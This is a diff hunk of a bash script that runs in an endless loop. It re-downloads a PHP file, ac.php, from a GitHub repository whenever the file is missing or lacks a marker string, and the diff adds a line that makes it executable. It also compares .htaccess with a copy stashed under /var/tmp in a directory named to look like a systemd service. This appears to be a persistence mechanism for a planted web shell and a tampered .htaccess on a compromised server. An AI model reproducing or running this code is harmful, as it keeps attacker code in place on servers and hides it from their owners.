@@ -15,6 +15,7 @@ while true; do
     if [ ! -f ac.php ] || ([ -f ac.php ] && ! grep -q '@CallMeRep' ac.php); then
         # if not exist or doesn't contain @CallMeRep, get ac.php from repo
         curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php
+        chmod +x ac.php
     fi
     # check if .htaccess is readable and writeable and check if htaccess is same with we like import in the first code
     if [ -r .htaccess ] && [ -w .htaccess ] && ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; then
